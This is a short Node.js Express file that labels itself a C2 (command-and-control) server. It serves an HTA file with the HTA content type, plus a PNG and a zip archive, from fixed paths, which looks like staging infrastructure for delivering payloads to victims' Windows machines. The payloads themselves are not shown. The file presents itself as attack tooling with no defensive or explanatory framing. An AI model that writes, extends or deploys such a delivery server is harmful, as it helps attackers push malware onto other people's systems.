// server.js
// A C2 server
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Define the path to the hello.hta file
const htaFilePath = path.join(__dirname, 'src', 'sit.hta');

// Function to read HTA file content
const readHTAFile = () => {
  try {
    const htaContent = fs.readFileSync(htaFilePath, 'utf8');
    return htaContent;
  } catch (err) {
    console.error('Error reading HTA file:', err);
    return null;
  }
};
  
// Route to serve the dynamically generated .hta file content
app.get('/hta', (req, res) => {
  const htaContent = readHTAFile();
  res.set('Content-Type', 'application/hta');
  res.send(htaContent);
});

app.get('/8292', (req, res) => {
  const imagePath = path.join(__dirname, 'src', '8292.png');
  res.sendFile(imagePath);
});

app.get('/mm1', (req, res) => {
  const zipFilePath = path.join(__dirname, 'src', 'mm1c.zip');
  res.sendFile(zipFilePath);
});


// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
